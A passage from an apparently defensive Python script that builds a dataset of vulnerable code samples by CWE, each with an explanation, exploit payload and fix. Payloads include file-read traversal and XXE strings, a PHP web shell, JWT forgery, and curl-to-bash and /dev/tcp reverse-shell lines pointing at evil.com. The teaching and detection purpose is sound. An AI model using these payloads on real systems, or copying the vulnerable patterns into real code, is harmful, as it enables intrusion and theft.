  'Extract credentials → `psql -h prod-db.internal -U admin -d customers` → full DB access.',
  'import os\nreturn psycopg2.connect(\n    host=os.environ["DB_HOST"],\n    database=os.environ["DB_NAME"],\n    user=os.environ["DB_USER"],\n    password=os.environ["DB_PASS"]\n)')

# --- CWE-22: Path Traversal (3) ---
V("Python",
  'from flask import request, send_file\nimport os\n\n@app.route("/download")\ndef download():\n    filename = request.args.get("file")\n    return send_file(os.path.join("/var/www/uploads", filename))',
  22, "Path Traversal", "High (8/10)",
  ["User-supplied `filename` is joined with base directory using `os.path.join`",
   "`os.path.join` does NOT prevent `../` sequences in the filename",
   "Attacker requests `?file=../../../etc/passwd` to read system files",
   "Can access any file readable by the web server process"],
  'GET `/download?file=../../../etc/passwd` reads system users. `?file=../../../proc/self/environ` leaks environment variables with secrets.',
  'from pathlib import Path\nbase = Path("/var/www/uploads").resolve()\npath = (base / filename).resolve()\nif not str(path).startswith(str(base)):\n    abort(403)\nreturn send_file(path)')

V("Node.js",
  'app.get("/static/:file", (req, res) => {\n  const filePath = path.join(__dirname, "public", req.params.file);\n  res.sendFile(filePath);\n});',
  22, "Path Traversal in Express.js", "High (8/10)",
  ["`req.params.file` may contain `../` sequences for directory traversal",
   "`path.join` resolves `..` but doesn't restrict to the `public` directory",
   "Attacker accesses `GET /static/../../.env` to read environment config",
   "Entire server filesystem accessible up to process permissions"],
  'GET `/static/..%2F..%2F..%2Fetc/passwd` (URL-encoded) traverses to system files.',
  'const safePath = path.resolve(path.join(__dirname, "public", req.params.file));\nif (!safePath.startsWith(path.resolve(path.join(__dirname, "public")))) {\n  return res.status(403).send("Forbidden");\n}\nres.sendFile(safePath);')

V("Java",
  'protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    String name = req.getParameter("doc");\n    File f = new File("/var/docs/" + name);\n    Files.copy(f.toPath(), resp.getOutputStream());\n}',
  22, "Path Traversal in Java Servlet", "High (8/10)",
  ["Parameter `doc` concatenated to base path without validation",
   "`../` sequences in `doc` escape the intended directory",
   "Attacker reads arbitrary files on the server",
   "`Files.copy` streams file contents to HTTP response"],
  'GET `?doc=../../../etc/passwd` reads system file. `?doc=../../opt/app/application.properties` leaks DB credentials.',
  'Path base = Paths.get("/var/docs/").toRealPath();\nPath target = base.resolve(name).normalize();\nif (!target.startsWith(base)) {\n    resp.sendError(403);\n    return;\n}')

# --- CWE-434: File Upload (3) ---
V("PHP",
  '<?php\n$target = "uploads/" . basename($_FILES["file"]["name"]);\nmove_uploaded_file($_FILES["file"]["tmp_name"], $target);\necho "Uploaded: $target";\n?>',
  434, "Unrestricted File Upload", "Critical (9/10)",
  ["File extension is not validated — any file type can be uploaded",
   "`basename()` only strips path components, doesn't check extension",
   "Attacker uploads `shell.php` containing `<?php system($_GET['cmd']); ?>`",
   "Web server executes PHP file — full Remote Code Execution"],
  'Upload `shell.php` → access `http://target/uploads/shell.php?cmd=whoami` → RCE.',
  '$allowed = ["jpg","png","gif","pdf"];\n$ext = strtolower(pathinfo($_FILES["file"]["name"], PATHINFO_EXTENSION));\nif (!in_array($ext, $allowed)) die("Invalid file type");\n$target = "uploads/" . bin2hex(random_bytes(16)) . "." . $ext;')

V("Python",
  '@app.route("/upload", methods=["POST"])\ndef upload():\n    file = request.files["file"]\n    file.save(os.path.join("uploads", file.filename))\n    return "Uploaded"',
  434, "Unrestricted File Upload in Flask", "Critical (9/10)",
  ["`file.filename` is used directly — no extension validation or sanitization",
   "Attacker uploads file with double extension (`shell.php.jpg`) or `.py` file",
   "If uploads directory is web-accessible, uploaded scripts execute",
   "`file.filename` can also contain path traversal sequences"],
  'Upload file named `../../../tmp/backdoor.py` to write outside uploads dir.',
  'from werkzeug.utils import secure_filename\nALLOWED = {"png","jpg","gif","pdf"}\ndef allowed(fn): return "." in fn and fn.rsplit(".",1)[1].lower() in ALLOWED\n\nif not allowed(file.filename): abort(400)\nfile.save(os.path.join("uploads", secure_filename(file.filename)))')

V("Node.js",
  'const multer = require("multer");\nconst storage = multer.diskStorage({\n  destination: "uploads/",\n  filename: (req, file, cb) => cb(null, file.originalname)\n});\nconst upload = multer({ storage });\napp.post("/upload", upload.single("file"), (req, res) => {\n  res.send("Uploaded: " + req.file.filename);\n});',
  434, "Unrestricted File Upload in Node.js", "Critical (9/10)",
  ["Original filename preserved without sanitization or extension check",
   "No file type validation (MIME type or magic bytes)",
   "Attacker uploads executable file (`.js`, `.html`, `.svg` with XSS)",
   "If served statically, uploaded HTML/SVG executes in browser context"],
  'Upload `exploit.html` with XSS payload → serve from `/uploads/exploit.html` → stored XSS.',
  'filename: (req, file, cb) => {\n  const ext = path.extname(file.originalname).toLowerCase();\n  if (![".jpg",".png",".pdf"].includes(ext)) return cb(new Error("Invalid type"));\n  cb(null, crypto.randomUUID() + ext);\n}')

# --- CWE-611: XXE (3) ---
V("Java",
  'DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();\nDocument doc = builder.parse(new InputSource(new StringReader(xmlInput)));',
  611, "XML External Entity (XXE) Injection", "Critical (9/10)",
  ["Default `DocumentBuilderFactory` enables external entity processing",
   "Attacker injects DTD with external entity referencing local files or URLs",
   "`<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>` reads files",
   "Can escalate to SSRF, denial of service (Billion Laughs), or data exfiltration"],
  'Payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>` reads /etc/passwd.',
  'DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nfactory.setFeature("http://xml.org/sax/features/external-general-entities", false);')

V("Python",
  'from lxml import etree\n\ndef parse_xml(xml_string):\n    parser = etree.XMLParser(resolve_entities=True)\n    root = etree.fromstring(xml_string.encode(), parser)\n    return root',
  611, "XXE in Python lxml", "Critical (9/10)",
  ["`resolve_entities=True` enables external entity resolution",
   "User-supplied XML string is parsed with entity processing enabled",
   "Attacker injects `<!ENTITY xxe SYSTEM 'file:///etc/passwd'>` to read files",
   "Out-of-band exfiltration possible via `SYSTEM 'http://attacker.com/?data=...'`"],
  'Input: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>` reads shadow file.',
  'parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False)\nroot = etree.fromstring(xml_string.encode(), parser)')

V("PHP",
  '<?php\n$xml = file_get_contents("php://input");\n$doc = simplexml_load_string($xml);\necho $doc->name;\n?>',
  611, "XXE in PHP SimpleXML", "Critical (9/10)",
  ["`simplexml_load_string` processes external entities by default (PHP < 8.0)",
   "Raw POST body parsed as XML without disabling entity loading",
   "Attacker sends XXE payload to read local files",
   "PHP wrapper `php://filter` enables base64-encoded file exfiltration"],
  'POST: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root><name>&xxe;</name></root>` exfiltrates files.',
  'libxml_disable_entity_loader(true);  // PHP < 8.0\n$doc = simplexml_load_string($xml, "SimpleXMLElement", LIBXML_NOENT | LIBXML_DTDLOAD);')

# --- CWE-287/306/862: Auth Issues (7) ---
V("Python",
  'import jwt\n\ndef verify_token(token):\n    header = jwt.get_unverified_header(token)\n    if header["alg"] == "none":\n        return jwt.decode(token, options={"verify_signature": False})\n    return jwt.decode(token, SECRET_KEY, algorithms=["HS256"])',
  287, "JWT None Algorithm Bypass", "Critical (10/10)",
  ["Code accepts `alg: none` tokens without signature verification",
   "Attacker crafts token with `alg: none` and arbitrary claims",
   "No signature is verified — attacker sets `role: admin`",
   "Complete authentication bypass"],
  'Forge: `header={"alg":"none","typ":"JWT"}`, `payload={"user_id":1,"role":"admin"}` → base64url encode → append `.` → valid token.',
  'return jwt.decode(token, SECRET_KEY, algorithms=["HS256"])  # Never allow "none"')

V("Python",
  'def authenticate(username, password):\n    user = db.get_user(username)\n    if user and user.password == password:\n        return create_session(user)\n    return None',
  287, "Timing-Unsafe Password Comparison", "Medium (6/10)",
  ["String `==` comparison short-circuits on first differing character",
   "Timing difference reveals how many leading characters are correct",
   "Attacker performs byte-by-byte timing attack to recover password",
   "Also: password compared in plaintext — should be hashed"],
  'Measure response time for `password="a..."` vs `password="b..."` — correct first char takes longer. Repeat per position.',
  'import hmac\ndef authenticate(username, password):\n    user = db.get_user(username)\n    if user and hmac.compare_digest(hash_password(password), user.password_hash):\n        return create_session(user)')

V("JavaScript",
  'app.post("/login", (req, res) => {\n  const { user, pass } = req.body;\n  if (user === pass) {\n    // simplified for example\n    res.json({ token: jwt.sign({ user, role: "user" }, secret) });\n  }\n});',
  287, "Weak Authentication Logic", "Critical (9/10)",
  ["Authentication only checks if username equals password",
   "Any user can authenticate with `user=X, pass=X`",
   "No database lookup or password hash verification",
   "Trivially bypassable — equivalent to no authentication"],
  'POST `{"user":"admin","pass":"admin"}` — grants access with any matching pair.',
  'const user = await db.findUser(req.body.user);\nif (user && await bcrypt.compare(req.body.pass, user.passwordHash)) { ... }')

V("Python",
  '@app.route("/admin/users", methods=["DELETE"])\ndef delete_user():\n    user_id = request.args.get("id")\n    db.execute("DELETE FROM users WHERE id = %s", (user_id,))\n    return "Deleted"',
  306, "Missing Authentication for Critical Function", "Critical (10/10)",
  ["Admin endpoint `/admin/users` has no authentication check",
   "No `@login_required` decorator or session validation",
   "Anyone can send DELETE request to remove arbitrary users",
   "Critical admin function exposed to anonymous access"],
  '`curl -X DELETE http://target/admin/users?id=1` deletes admin user without auth.',
  '@app.route("/admin/users", methods=["DELETE"])\n@login_required\n@admin_required\ndef delete_user():\n    ...')

V("JavaScript",
  'app.post("/api/graphql", (req, res) => {\n  // No auth middleware\n  const result = graphql(schema, req.body.query);\n  res.json(result);\n});',
  306, "Missing Authentication on GraphQL Endpoint", "Critical (9/10)",
  ["GraphQL endpoint has no authentication middleware",
   "All queries and mutations are accessible without login",
   "Attacker performs introspection to discover schema",
   "All CRUD operations available to anonymous users"],
  '`{__schema{types{name,fields{name}}}}` discovers schema → `mutation{deleteUser(id:1){id}}` deletes users.',
  'app.post("/api/graphql", authMiddleware, (req, res) => { ... });\n// Also disable introspection in production')

V("Python",
  '@app.route("/api/orders/<order_id>")\n@login_required\ndef get_order(order_id):\n    order = db.query("SELECT * FROM orders WHERE id = %s", (order_id,))\n    return jsonify(order)',
  639, "Insecure Direct Object Reference (IDOR)", "High (8/10)",
  ["Endpoint authenticates user but doesn't verify ownership of requested order",
   "Any logged-in user can access any order by changing `order_id`",
   "No check that `order.user_id == current_user.id`",
   "Horizontal privilege escalation — access other users' data"],
  'Authenticated as user A, request `GET /api/orders/12345` to view user B\'s order details.',
  '@app.route("/api/orders/<order_id>")\n@login_required\ndef get_order(order_id):\n    order = db.query("SELECT * FROM orders WHERE id=%s AND user_id=%s", (order_id, current_user.id))\n    if not order: abort(403)')

V("Node.js",
  'app.get("/api/users/:id", authenticate, (req, res) => {\n  User.findById(req.params.id).then(user => {\n    res.json({ email: user.email, ssn: user.ssn, salary: user.salary });\n  });\n});',
  862, "Missing Authorization (IDOR)", "High (8/10)",
  ["User is authenticated but authorization check is missing",
   "Any authenticated user can fetch any other user's sensitive data",
   "No check that `req.params.id === req.user.id` or admin role",
   "Exposes PII (SSN, salary) of all users"],
  'Authenticated user fetches `GET /api/users/1` through `/api/users/N` to enumerate all user PII.',
  'if (req.params.id !== req.user.id && req.user.role !== "admin") {\n  return res.status(403).json({ error: "Forbidden" });\n}')

# --- CWE-327/330/295: Crypto Issues (7) ---
V("Python",
  'import hashlib\ndef hash_password(password):\n    return hashlib.md5(password.encode()).hexdigest()',
  327, "Use of Broken Cryptographic Algorithm (MD5)", "High (8/10)",
  ["MD5 is cryptographically broken — collision attacks are practical",
   "No salt used — identical passwords produce identical hashes",
   "Rainbow tables and hashcat crack MD5 hashes in seconds",
   "NIST deprecated MD5 for security purposes in 2004"],
  'Dump hash → `hashcat -m 0 hash.txt rockyou.txt` cracks most passwords in seconds.',
  'import bcrypt\ndef hash_password(password):\n    return bcrypt.hashpw(password.encode(), bcrypt.gensalt())')

V("Java",
  'Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");\nSecretKey key = SecretKeyFactory.getInstance("DES").generateSecret(new DESKeySpec(keyBytes));\ncipher.init(Cipher.ENCRYPT_MODE, key);\nbyte[] encrypted = cipher.doFinal(plaintext);',
  327, "Use of Broken Cipher (DES)", "High (8/10)",
  ["DES uses 56-bit keys — brute force is trivial with modern hardware",
   "ECB mode encrypts identical blocks identically — reveals patterns",
   "DES was deprecated by NIST in 2005, withdrawn in 2023",
   "Combined DES+ECB provides virtually no security"],
  'DES key space (2^56) is crackable in hours with FPGA or GPU clusters.',
  'Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");\nKeyGenerator kg = KeyGenerator.getInstance("AES");\nkg.init(256);')

V("Python",
  'from Crypto.Cipher import AES\n\ndef encrypt(key, data):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(pad(data, 16))',
  327, "AES in ECB Mode", "High (7/10)",
  ["AES-ECB encrypts each block independently — no diffusion between blocks",
   "Identical plaintext blocks produce identical ciphertext blocks",
   "Reveals patterns in structured data (the 'ECB penguin' problem)",
   "No authentication — ciphertext can be modified without detection"],
  'Swap ciphertext blocks to reorder data. Identical blocks reveal repeated data patterns.',
  'from Crypto.Cipher import AES\nfrom Crypto.Random import get_random_bytes\nnonce = get_random_bytes(12)\ncipher = AES.new(key, AES.MODE_GCM, nonce=nonce)')

V("JavaScript",
  'function generateToken() {\n  return Math.random().toString(36).substr(2);\n}',
  330, "Insufficient Randomness for Security Token", "High (8/10)",
  ["`Math.random()` uses a PRNG — not cryptographically secure",
   "Output is predictable if seed or internal state is known",
   "Generated tokens can be predicted or brute-forced",
   "Session tokens, CSRF tokens, and password reset tokens must use CSPRNG"],
  'Predict Math.random() sequence by observing multiple outputs → forge future tokens.',
  'const crypto = require("crypto");\nfunction generateToken() {\n  return crypto.randomBytes(32).toString("hex");\n}')

V("Python",
  'import random\ndef generate_reset_token():\n    return str(random.randint(100000, 999999))',
  330, "Predictable Password Reset Token", "High (8/10)",
  ["`random.randint` uses Mersenne Twister — not cryptographically secure",
   "Only 900,000 possible values — easily brute-forced",
   "Attacker requests reset for victim, brute-forces 6-digit code",
   "Without rate limiting, account takeover in minutes"],
  'Brute-force 6-digit codes: `for i in range(100000,999999): try_reset(victim_email, i)`',
  'import secrets\ndef generate_reset_token():\n    return secrets.token_urlsafe(32)')

V("Python",
  'import requests\nresp = requests.get("https://api.payment-processor.com/charge", verify=False)',
  295, "Disabled TLS Certificate Verification", "High (8/10)",
  ["`verify=False` disables SSL/TLS certificate validation",
   "Connection is vulnerable to man-in-the-middle attacks",
   "Attacker intercepts HTTPS traffic with self-signed certificate",
   "Payment data transmitted over interceptable 'encrypted' channel"],
  'Attacker on same network performs MITM with mitmproxy → captures payment API requests.',
  'resp = requests.get("https://api.payment-processor.com/charge", verify=True)\n# Or with custom CA: verify="/path/to/ca-bundle.crt"')

V("Node.js",
  'const https = require("https");\nconst agent = new https.Agent({ rejectUnauthorized: false });\naxios.get("https://internal-api.corp.com/data", { httpsAgent: agent });',
  295, "Disabled TLS Certificate Validation in Node.js", "High (8/10)",
  ["`rejectUnauthorized: false` accepts any certificate including self-signed",
   "MITM attacker presents fake certificate — connection proceeds",
   "Internal API traffic can be intercepted on compromised network",
   "Often done to 'fix' self-signed cert errors — creates critical vulnerability"],
  'ARP spoof + mitmproxy with self-signed cert → intercept all internal API traffic.',
  'const agent = new https.Agent({\n  rejectUnauthorized: true,\n  ca: fs.readFileSync("/path/to/internal-ca.pem")\n});')

# --- CWE-352/601/400/942/200/312/319 (13) ---
V("Python",
  '@app.route("/transfer", methods=["POST"])\n@login_required\ndef transfer():\n    to = request.form["to"]\n    amount = request.form["amount"]\n    db.execute("UPDATE accounts SET balance = balance - %s WHERE id = %s", (amount, current_user.id))\n    db.execute("UPDATE accounts SET balance = balance + %s WHERE id = %s", (amount, to))\n    return "Done"',
  352, "Cross-Site Request Forgery (CSRF)", "High (8/10)",
  ["State-changing POST endpoint has no CSRF token validation",
   "No `@csrf.protect` decorator or token in form",
   "Attacker creates malicious page with auto-submitting form targeting this endpoint",
   "Victim's browser sends authenticated request — transfers funds without consent"],
  'Attacker hosts: `<form action="http://bank.com/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="10000"><script>document.forms[0].submit()</script></form>`',
  'from flask_wtf.csrf import CSRFProtect\ncsrf = CSRFProtect(app)\n# Forms must include {{ csrf_token() }}')

V("JavaScript",
  'app.post("/account/settings", (req, res) => {\n  const { email, password } = req.body;\n  User.update(req.session.userId, { email, password });\n  res.send("Updated");\n});',
  352, "CSRF in Express.js", "High (8/10)",
  ["Account settings endpoint accepts POST without CSRF validation",
   "No `csurf` middleware or token verification",
   "Attacker crafts page that POSTs to victim's session",
   "Can change victim's email and password — full account takeover"],
  'Hidden form on attacker site POSTs `email=attacker@evil.com&password=hacked` using victim session.',
  'const csrf = require("csurf");\napp.use(csrf({ cookie: true }));\n// Include req.csrfToken() in forms')

V("PHP",
  '<?php\n$url = $_GET["redirect"];\nheader("Location: $url");\nexit;\n?>',
  601, "Open Redirect", "Medium (6/10)",
  ["User-supplied `redirect` parameter used directly in `Location` header",
   "No validation that URL points to same domain",
   "Attacker crafts link: `http://trusted.com/redirect?redirect=http://evil.com/phish`",
   "Victim trusts the link because it starts with trusted domain"],
  '`http://bank.com/?redirect=http://evil.com/fake-login` — victim enters credentials on phishing page.',
  '$url = $_GET["redirect"];\n$parsed = parse_url($url);\nif (isset($parsed["host"]) && $parsed["host"] !== "trusted.com") {\n    $url = "/";\n}\nheader("Location: $url");')

V("JavaScript",
  'app.get("/goto", (req, res) => {\n  res.redirect(req.query.url);\n});',
  601, "Open Redirect in Express.js", "Medium (6/10)",
  ["`req.query.url` is passed directly to `res.redirect` without validation",
   "Attacker constructs `http://app.com/goto?url=http://evil.com/phish`",
   "Users trust links from `app.com` domain",
   "Used in phishing, OAuth token theft, and login flow hijacking"],
  '`/goto?url=https://evil.com/fake-oauth-consent` steals OAuth authorization codes.',
  'const allowedHosts = ["app.com", "api.app.com"];\nconst parsed = new URL(req.query.url, "http://app.com");\nif (!allowedHosts.includes(parsed.hostname)) return res.redirect("/");')

V("Python",
  'import re\n\ndef validate_email(email):\n    pattern = r"^([a-zA-Z0-9_\\-\\.]+)@((\\[[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.)|(([a-zA-Z0-9\\-]+\\.)+))([a-zA-Z]{2,}|[0-9]{1,3})(\\]?)$"\n    return bool(re.match(pattern, email))',
  400, "ReDoS (Regular Expression Denial of Service)", "High (7/10)",
  ["Complex regex with nested quantifiers and alternation groups",
   "Catastrophic backtracking on crafted input (exponential time)",
   "Attacker sends `'a@' + 'a' * 50 + '!'` — regex engine hangs",
   "Single request can consume CPU for minutes, causing DoS"],
  'Input: `"aaa...aaa@aaa...aaa!"` (50+ chars) — regex takes exponential time to fail.',
  'import re\ndef validate_email(email):\n    # Simple, non-backtracking pattern\n    return bool(re.match(r"^[^@]+@[^@]+\\.[^@]+$", email))')

V("JavaScript",
  'app.get("/api/data", (req, res) => {\n  res.setHeader("Access-Control-Allow-Origin", "*");\n  res.setHeader("Access-Control-Allow-Credentials", "true");\n  res.json(getUserData(req));\n});',
  942, "Permissive CORS with Credentials", "High (8/10)",
  ["`Access-Control-Allow-Origin: *` allows any domain to read responses",
   "`Access-Control-Allow-Credentials: true` sends cookies with cross-origin requests",
   "Browsers actually block `*` with credentials, but reflecting Origin header doesn't",
   "Any website can read authenticated user data via cross-origin fetch"],
  'Attacker site: `fetch("http://api.target.com/api/data", {credentials:"include"}).then(r=>r.json()).then(d=>send_to_attacker(d))`',
  'const ALLOWED = ["https://app.example.com"];\nconst origin = req.headers.origin;\nif (ALLOWED.includes(origin)) {\n  res.setHeader("Access-Control-Allow-Origin", origin);\n}')

V("Node.js",
  'app.get("/api/data", (req, res) => {\n  const origin = req.headers.origin;\n  res.setHeader("Access-Control-Allow-Origin", origin);\n  res.setHeader("Access-Control-Allow-Credentials", "true");\n  res.json(getSecretData(req));\n});',
  942, "CORS Origin Reflection", "High (8/10)",
  ["Server reflects the `Origin` header directly in CORS response",
   "Any origin is allowed — equivalent to wildcard but works with credentials",
   "Attacker's site sends credentialed request, server reflects their origin",
   "Bypasses same-origin policy — attacker reads authenticated responses"],
  'Attacker sets `Origin: https://evil.com` → server responds `ACAO: https://evil.com` → browser allows cross-origin read.',
  'const ALLOWED = new Set(["https://app.example.com"]);\nif (ALLOWED.has(origin)) {\n  res.setHeader("Access-Control-Allow-Origin", origin);\n}')

V("Python",
  'from flask import Flask\napp = Flask(__name__)\napp.config["DEBUG"] = True\n\n@app.errorhandler(500)\ndef error(e):\n    return str(e), 500',
  200, "Information Exposure via Debug Mode", "Medium (6/10)",
  ["Flask debug mode enabled in production — exposes Werkzeug debugger",
   "500 errors reveal full stack traces with source code",
   "Werkzeug debugger console allows arbitrary Python code execution",
   "Internal paths, library versions, and configuration leaked"],
  'Trigger error → Werkzeug interactive debugger appears → enter PIN (if leaked) → execute arbitrary Python.',
  'app.config["DEBUG"] = False\n\n@app.errorhandler(500)\ndef error(e):\n    return "Internal Server Error", 500')

V("Java",
  'catch (SQLException e) {\n    response.getWriter().write("Error: " + e.getMessage());\n    e.printStackTrace(response.getWriter());\n}',
  200, "Stack Trace Information Exposure", "Medium (6/10)",
  ["Full SQL exception message returned to client",
   "`printStackTrace` writes complete stack trace to HTTP response",
   "Reveals database table names, column names, SQL syntax",
   "Attacker uses error details to craft more targeted attacks"],
  'Malformed input → stack trace reveals `com.mysql.jdbc.exceptions.jdbc4` + table name `users_v2` + column `hashed_pw`.',
  'catch (SQLException e) {\n    logger.error("Database error", e);\n    response.getWriter().write("An error occurred. Reference: " + errorId);\n}')

V("JavaScript",
  'app.use((err, req, res, next) => {\n  res.status(500).json({\n    error: err.message,\n    stack: err.stack,\n    env: process.env\n  });\n});',
  200, "Environment Variable Leakage", "Critical (9/10)",
  ["Error handler exposes `process.env` in HTTP response",
   "Environment variables contain DB passwords, API keys, JWT secrets",
   "Full stack trace reveals internal file paths and library versions",
   "Single error leaks all server secrets"],
  'Trigger any 500 error → response includes `DB_PASSWORD`, `JWT_SECRET`, `AWS_ACCESS_KEY_ID` from env.',
  'app.use((err, req, res, next) => {\n  console.error(err);\n  res.status(500).json({ error: "Internal error", id: generateErrorId() });\n});')

V("Python",
  'from flask import Flask\nimport sqlite3\n\n@app.route("/register", methods=["POST"])\ndef register():\n    username = request.form["user"]\n    password = request.form["pass"]\n    db.execute("INSERT INTO users (name, password) VALUES (?, ?)", (username, password))\n    return "Registered"',
  312, "Cleartext Storage of Password", "High (8/10)",
  ["Password stored in database as plaintext — no hashing",
   "Database breach exposes all passwords in cleartext",
   "Users who reuse passwords are compromised across services",
   "Violates OWASP, NIST 800-63B, and PCI-DSS requirements"],
  'SQL injection or DB backup exposure → all passwords readable. `SELECT password FROM users` dumps cleartext.',
  'import bcrypt\npassword_hash = bcrypt.hashpw(request.form["pass"].encode(), bcrypt.gensalt())\ndb.execute("INSERT INTO users (name, password) VALUES (?, ?)", (username, password_hash))')

V("Python",
  'import socket\n\ndef send_credentials(host, port, username, password):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((host, port))\n    sock.send(f"{username}:{password}".encode())\n    return sock.recv(1024)',
  319, "Cleartext Transmission of Credentials", "High (8/10)",
  ["Credentials sent over unencrypted TCP socket",
   "No TLS/SSL wrapping — data transmitted in plaintext",
   "Network sniffer (Wireshark, tcpdump) captures username and password",
   "MITM attacker reads or modifies credentials in transit"],
  '`tcpdump -i eth0 port 8080 -A` on same network → captures `admin:P@ssw0rd` in plaintext.',
  'import ssl\ncontext = ssl.create_default_context()\nsock = context.wrap_socket(socket.socket(), server_hostname=host)\nsock.connect((host, port))')

V("Ruby",
  'class UsersController < ApplicationController\n  def update\n    @user = User.find(params[:id])\n    @user.update(params[:user])\n    redirect_to @user\n  end\nend',
  915, "Mass Assignment Vulnerability", "High (8/10)",
  ["`params[:user]` passed directly to `update` without strong parameters",
   "Attacker adds unexpected fields: `user[role]=admin` or `user[is_admin]=true`",
   "Horizontal/vertical privilege escalation via parameter injection",
   "Any model attribute can be set by the attacker"],
  'POST `/users/5` with `user[role]=admin&user[is_admin]=true` → attacker becomes admin.',
  'def user_params\n  params.require(:user).permit(:name, :email, :bio)\nend\n@user.update(user_params)')

V("Python",
  'class UserSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = User\n        fields = "__all__"',
  915, "Mass Assignment in Django REST Framework", "High (7/10)",
  ["`fields = '__all__'` exposes every model field for reading and writing",
   "Includes sensitive fields: `is_staff`, `is_superuser`, `password`",
   "Attacker sends `{\"is_superuser\": true}` in PUT/PATCH request",
   "Privilege escalation to superuser without authorization check"],
  'PATCH `/api/users/me/` with `{"is_superuser": true, "is_staff": true}` → admin access.',
  'class UserSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = User\n        fields = ["id", "username", "email", "bio"]\n        read_only_fields = ["id"]')

# --- CWE-94/95/98: Code/Eval/Include (7) ---
V("Python",
  'from flask import request\n\n@app.route("/calc")\ndef calc():\n    expr = request.args.get("expr")\n    result = eval(expr)\n    return str(result)',
  95, "Code Injection via eval()", "Critical (10/10)",
  ["`eval()` executes arbitrary Python expressions from user input",
   "No sandboxing, input validation, or restricted builtins",
   "Attacker executes `__import__('os').system('id')` via `expr` parameter",
   "Full RCE — arbitrary system commands as web server user"],
  'GET `/calc?expr=__import__("os").popen("cat /etc/passwd").read()` reads system files.',
  'import ast\ndef safe_eval(expr):\n    tree = ast.parse(expr, mode="eval")\n    for node in ast.walk(tree):\n        if not isinstance(node, (ast.Expression, ast.BinOp, ast.Num, ast.UnaryOp, ast.operator, ast.unaryop)):\n            raise ValueError("Unsafe expression")\n    return eval(compile(tree, "<string>", "eval"))')

V("JavaScript",
  'app.get("/run", (req, res) => {\n  const code = req.query.code;\n  const result = eval(code);\n  res.json({ result });\n});',
  95, "Code Injection via JavaScript eval()", "Critical (10/10)",
  ["`eval()` executes arbitrary JavaScript from user input",
   "Access to Node.js runtime — `require`, `process`, `fs` modules",
   "Attacker executes `require('child_process').execSync('id').toString()`",
   "Complete server compromise via arbitrary command execution"],
  'GET `/run?code=require("child_process").execSync("cat /etc/passwd").toString()` reads files.',
  '// Use a safe expression parser like math.js\nconst math = require("mathjs");\nconst result = math.evaluate(code);')

V("Python",
  'def run_plugin(plugin_code):\n    exec(plugin_code)\n    return "Plugin executed"',
  94, "Code Injection via exec()", "Critical (10/10)",
  ["`exec()` runs arbitrary Python statements from `plugin_code`",
   "Can import modules, open files, execute system commands",
   "No sandbox, restricted builtins, or code validation",
   "Attacker supplies malicious plugin code for full RCE"],
  'plugin_code = `import subprocess; subprocess.run(["curl","http://evil.com/shell.sh","|","bash"])` — reverse shell.',
  '# Use a restricted execution environment or plugin allowlist\nimport importlib\ndef run_plugin(name):\n    if name not in ALLOWED_PLUGINS: raise ValueError("Not allowed")\n    mod = importlib.import_module(f"plugins.{name}")\n    return mod.run()')

V("Ruby",
  'def evaluate(input)\n  instance_eval(input)\nend',
  94, "Code Injection via Ruby instance_eval", "Critical (10/10)",
  ["`instance_eval` evaluates arbitrary Ruby code in the object's context",
   "User input is executed as Ruby with full access to object internals",
   "Attacker calls `system('id')` or `exec('bash -i >& /dev/tcp/...')`",
   "Complete server compromise"],
  'Input: `` `cat /etc/passwd` `` or `system("curl evil.com/shell|bash")` — full RCE.',
  '# Never eval user input. Use a DSL parser or allowlisted operations\ndef evaluate(operation)\n  case operation\n  when "status" then get_status\n  else raise "Unknown operation"\n  end\nend')

V("PHP",
  '<?php\n$page = $_GET["page"];\ninclude($page . ".php");\n?>',
  98, "Local File Inclusion (LFI)", "Critical (9/10)",
  ["User-supplied `page` parameter used directly in `include()` statement",
   "Attacker uses `../` traversal to include arbitrary PHP files",
   "`page=../../etc/passwd%00` reads system files (null byte in older PHP)",
   "With log poisoning, LFI escalates to RCE"],
  '`?page=../../../var/log/apache2/access` after injecting `<?php system($_GET["c"]);?>` in User-Agent → RCE via log poisoning.',
  '$allowed = ["home","about","contact"];\nif (!in_array($page, $allowed)) die("Invalid page");\ninclude($page . ".php");')

V("PHP",
  '<?php\n$template = $_GET["tpl"];\nrequire("https://templates.example.com/" . $template);\n?>',
  98, "Remote File Inclusion (RFI)", "Critical (10/10)",
  ["`require()` with `allow_url_include=On` loads remote PHP files",
   "Attacker supplies URL to their server hosting malicious PHP",
   "`?tpl=http://evil.com/shell.txt` — server fetches and executes attacker's code",
   "Immediate Remote Code Execution"],
  '`?tpl=http://evil.com/backdoor.txt` where backdoor.txt contains `<?php system($_GET["c"]);?>` — full RCE.',
  '// Disable allow_url_include in php.ini\n$allowed = ["header","footer","sidebar"];\nif (!in_array($template, $allowed)) die("Invalid template");\nrequire($template . ".php");')

V("Python",
  'from jinja2 import Template\n\n@app.route("/render")\ndef render_page():\n    name = request.args.get("name")\n    template = Template(f"Hello {name}!")\n    return template.render()',
  94, "Server-Side Template Injection (SSTI) in Jinja2", "Critical (10/10)",
  ["User input `name` is embedded in template string before compilation",
   "Jinja2 template syntax `{{ }}` in `name` is interpreted and executed",
   "Attacker supplies `{{config}}` to dump Flask configuration",
   "MRO chain traversal leads to arbitrary command execution"],
  'GET `?name={{config.items()}}` dumps config. `?name={{"".__class__.__mro__[1].__subclasses__()}}` enumerates classes for RCE chain.',
